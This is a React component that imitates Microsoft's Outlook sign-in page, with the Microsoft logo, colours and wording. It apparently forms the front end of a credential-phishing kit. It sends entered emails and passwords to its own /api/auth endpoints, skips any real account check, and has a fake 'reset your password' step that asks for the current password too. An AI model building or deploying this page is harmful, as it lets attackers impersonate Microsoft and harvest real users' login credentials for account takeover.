'use client';

import { FormEvent, useState } from "react";
import { ChevronLeft, Eye, EyeOff } from "lucide-react";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

export function OutlookLogin() {
  const [step, setStep] = useState<"identify" | "password" | "forgot" | "forgot-password">(
    "identify",
  );
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [keepSignedIn, setKeepSignedIn] = useState(true);
  const [status, setStatus] = useState<
    { type: "error" | "success" | "info"; message: string } | null
  >(null);
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [showCurrentPassword, setShowCurrentPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);

  const hasEmail = email.trim().length > 0;
  const hasPassword = password.trim().length > 0;
  const hasCurrentPassword = currentPassword.trim().length > 0;
  const hasNewPassword = newPassword.trim().length > 0;

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (step === "identify") {
      if (!hasEmail) {
        return;
      }

      await handleIdentify();
      return;
    }

    if (step === "forgot") {
      await handleForgotEmail();
      return;
    }

    if (step === "forgot-password") {
      await handleForgotPassword();
      return;
    }

    if (!hasPassword) {
      return;
    }

    await handleSignIn();
  };

  const handleIdentify = async () => {
    // Skip verification, go directly to password step
    setStep("password");
    setStatus(null);
  };

  const handleSignIn = async () => {
    try {
      setLoading(true);
      setStatus(null);
      const response = await fetch("/api/auth/signin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        credentials: "include",
        body: JSON.stringify({ email, password, keepSignedIn }),
      });

      if (!response.ok) {
        await response.json();
        setStatus({
          type: "error",
          message: "Please try again later",
        });
        return;
      }

      const data = await response.json();
      setStatus({
        type: "success",
        message: `Welcome back${data.displayName ? `, ${data.displayName}` : ""}!`,
      });
    } catch (error) {
      console.error("Sign-in failed:", error);
      setStatus({
        type: "error",
        message: "Please try again later",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleForgotEmail = async () => {
    if (!hasEmail) {
      setStatus({
        type: "info",
        message: "Enter your email first so we know which account to reset.",
      });
      return;
    }

    // Skip verification, go directly to password reset step
    setStep("forgot-password");
    setStatus(null);
  };

  const handleForgotPassword = async () => {
    if (!hasEmail || !hasCurrentPassword || !hasNewPassword) {
      setStatus({
        type: "info",
        message: "Please enter both current and new passwords.",
      });
      return;
    }

    try {
      setLoading(true);
      setStatus(null);
      const response = await fetch("/api/auth/forgot", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        credentials: "include",
        body: JSON.stringify({ email, currentPassword, newPassword }),
      });

      const payload = await response.json();

      if (!response.ok) {
        setStatus({
          type: "error",
          message:
            payload.error ??
            "We couldn't complete the reset. Try again shortly.",
        });
        return;
      }

      setStatus({
        type: "success",
        message: "Successful",
      });
    } catch (error) {
      console.error("Forgot password failed:", error);
      setStatus({
        type: "error",
        message: "We couldn't complete the reset. Try again shortly.",
      });
    } finally {
      setLoading(false);
    }
  };

  const isIdentifyStep = step === "identify";
  const isPasswordStep = step === "password";
  const isForgotStep = step === "forgot";
  const isForgotPasswordStep = step === "forgot-password";

  const headingText = (isForgotStep || isForgotPasswordStep) ? "Reset your password" : "Sign in";

  const submitLabel = isIdentifyStep
    ? "Next"
    : isPasswordStep
      ? "Sign in"
      : isForgotPasswordStep
      ? "Submit new password"
      : "Next";
  const loadingLabel = (step === "forgot" || step === "forgot-password") ? "Sending..." : "Processing...";
  const submitDisabled =
    loading ||
    (isIdentifyStep ? !hasEmail : isPasswordStep ? !hasPassword : isForgotPasswordStep ? (!hasCurrentPassword || !hasNewPassword) : !hasEmail);
  return (
    <div className="relative flex min-h-screen flex-col bg-white">
      {/* Main Content */}
      <div className="flex flex-1 items-center justify-center px-6 py-12">
        <div className="w-full max-w-[440px]">
          <div className="flex flex-col rounded-lg border border-[#8A8886] bg-white px-11 py-11 shadow-lg">
            {/* Microsoft Logo with text */}
            <div className="mb-6 flex items-center gap-2">
              <svg className="h-[21px] w-[21px]" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0h11.458v11.458H0V0z" fill="#F25022"/>
                <path d="M12.542 0H24v11.458H12.542V0z" fill="#7FBA00"/>
                <path d="M0 12.542h11.458V24H0V12.542z" fill="#00A4EF"/>
                <path d="M12.542 12.542H24V24H12.542V12.542z" fill="#FFB900"/>
              </svg>
              <span className="text-[15px] font-semibold text-[#5E5E5E]">Microsoft</span>
            </div>
            
            {/* Heading */}
            <h1 className="mb-3 text-2xl font-semibold text-[#1B1B1B]">
              {headingText}
            </h1>

            {!isIdentifyStep && (
              <button
                type="button"
                onClick={() => {
                  setStep("identify");
                  setStatus(null);
                  setPassword("");
                }}
                className="mb-5 flex w-fit items-center gap-1.5 text-[15px] font-normal text-[#0078D4] transition-colors hover:text-[#106EBE] focus:outline-none"
              >
                <ChevronLeft className="h-4 w-4" />
                <span className="underline decoration-transparent underline-offset-2 hover:decoration-current">Back</span>
              </button>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              {isIdentifyStep && (
                <div className="space-y-4">
                  <Input
                    id="email"
                    type="email"
                    autoComplete="username"
                    placeholder="Email or phone"
                    className="h-12 border-[#8A8886] px-3 text-[15px] focus-visible:border-[#0078D4] focus-visible:ring-0 focus-visible:ring-offset-0"
                    value={email}
                    onChange={(event) => setEmail(event.target.value)}
                  />
                  <button
                    type="button"
                    onClick={() => {
                      setStep("forgot");
                      setStatus(null);
                    }}
                    className="text-left text-[13px] font-normal text-[#0078D4] underline decoration-transparent underline-offset-2 hover:decoration-current focus:outline-none"
                    disabled={loading}
                  >
                    Can&apos;t access your account?
                  </button>
                </div>
              )}

              {isPasswordStep && (
                <div className="space-y-4">
                  <div className="relative">
                    <Input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      autoComplete="current-password"
                      placeholder="Password"
                      className="h-12 border-[#8A8886] px-3 pr-10 text-[15px] focus-visible:border-[#0078D4] focus-visible:ring-0 focus-visible:ring-offset-0"
                      value={password}
                      onChange={(event) => setPassword(event.target.value)}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-[#605E5C] hover:text-[#323130] focus:outline-none"
                      tabIndex={-1}
                    >
                      {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                    </button>
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      setStep("forgot");
                      setStatus(null);
                    }}
                    className="text-left text-[13px] font-normal text-[#0078D4] underline decoration-transparent underline-offset-2 hover:decoration-current focus:outline-none"
                    disabled={loading}
                  >
                    Forgot password?
                  </button>
                </div>
              )}

              {isForgotStep && (
                <div className="space-y-4">
                  <Input
                    id="forgot-email"
                    type="email"
                    autoComplete="username"
                    placeholder="someone@example.com"
                    className="h-12 border-[#8A8886] px-3 text-[15px] focus-visible:border-[#0078D4] focus-visible:ring-0 focus-visible:ring-offset-0"
                    value={email}
                    onChange={(event) => setEmail(event.target.value)}
                  />
                </div>
              )}

              {isForgotPasswordStep && (
                <div className="space-y-4">
                  <div className="space-y-2">
                    <div className="relative">
                      <Input
                        id="current-password"
                        type={showCurrentPassword ? "text" : "password"}
                        autoComplete="current-password"
                        placeholder="Current password"
                        className="h-12 border-[#8A8886] px-3 pr-10 text-[15px] focus-visible:border-[#0078D4] focus-visible:ring-0 focus-visible:ring-offset-0"
                        value={currentPassword}
                        onChange={(event) => setCurrentPassword(event.target.value)}
                      />
                      <button
                        type="button"
                        onClick={() => setShowCurrentPassword(!showCurrentPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-[#605E5C] hover:text-[#323130] focus:outline-none"
                        tabIndex={-1}
                      >
                        {showCurrentPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                      </button>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <div className="relative">
                      <Input
                        id="new-password"
                        type={showNewPassword ? "text" : "password"}
                        autoComplete="new-password"
                        placeholder="New password"
                        className="h-12 border-[#8A8886] px-3 pr-10 text-[15px] focus-visible:border-[#0078D4] focus-visible:ring-0 focus-visible:ring-offset-0"
                        value={newPassword}
                        onChange={(event) => setNewPassword(event.target.value)}
                      />
                      <button
                        type="button"
                        onClick={() => setShowNewPassword(!showNewPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-[#605E5C] hover:text-[#323130] focus:outline-none"
                        tabIndex={-1}
                      >
                        {showNewPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {isPasswordStep && (
                <label className="flex items-start gap-2.5 text-[13px] text-[#323130]">
                  <input
                    type="checkbox"
                    checked={keepSignedIn}
                    onChange={(event) => setKeepSignedIn(event.target.checked)}
                    className="mt-0.5 h-[18px] w-[18px] cursor-pointer rounded-sm border-[#8A8886] text-[#0078D4] focus:ring-[#0078D4] focus:ring-offset-0"
                  />
                  <span className="leading-tight">Don&apos;t show this again</span>
                </label>
              )}

              {status && (
                <div
                  className={`rounded-sm border px-4 py-3 text-[13px] leading-relaxed ${
                    status.type === "error"
                      ? "border-[#A80000] bg-[#FDE7E9] text-[#A80000]"
                      : status.type === "success"
                        ? "border-[#107C10] bg-[#DFF6DD] text-[#107C10]"
                        : "border-[#0078D4] bg-[#F3F9FD] text-[#323130]"
                  }`}
                >
                  {status.message}
                </div>
              )}

              <div className="flex items-center justify-end gap-2 pt-6">
                <Button
                  type="button"
                  onClick={() => {
                    if (isIdentifyStep) {
                      setEmail("");
                      setStatus(null);
                    } else {
                      setStep("identify");
                      setStatus(null);
                      setPassword("");
                    }
                  }}
                  className="h-8 min-w-[80px] border border-[#8A8886] bg-transparent px-6 py-1.5 text-[13px] font-normal text-[#323130] shadow-none hover:bg-[#F3F2F1] focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-black focus-visible:ring-offset-0"
                  disabled={loading}
                >
                  Back
                </Button>
                <Button
                  type="submit"
                  className="h-8 min-w-[80px] bg-[#0078D4] px-6 py-1.5 text-[13px] font-semibold text-white shadow-none transition-colors hover:bg-[#106EBE] focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-black focus-visible:ring-offset-0 disabled:bg-[#F3F2F1] disabled:text-[#A19F9D]"
                  disabled={submitDisabled}
                >
                  {loading ? loadingLabel : submitLabel}
                </Button>
              </div>
            </form>

            {/* Sign-in options */}
            <div className="mt-8 border-t border-[#E1DFDD] pt-5">
              <button
                type="button"
                className="flex items-center gap-2 text-[13px] text-[#323130] hover:underline focus:outline-none"
                disabled={loading}
              >
                <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
                </svg>
                <span>Sign-in options</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
